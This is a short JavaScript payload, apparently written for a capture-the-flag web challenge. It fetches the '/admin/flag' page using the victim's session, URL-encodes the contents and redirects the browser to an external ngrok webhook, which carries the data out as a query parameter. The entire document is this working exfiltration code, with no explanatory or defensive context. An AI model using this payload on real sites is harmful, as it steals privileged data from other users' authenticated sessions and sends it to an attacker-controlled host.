async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/admin/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://2b66-49-36-190-235.ngrok-free.app');
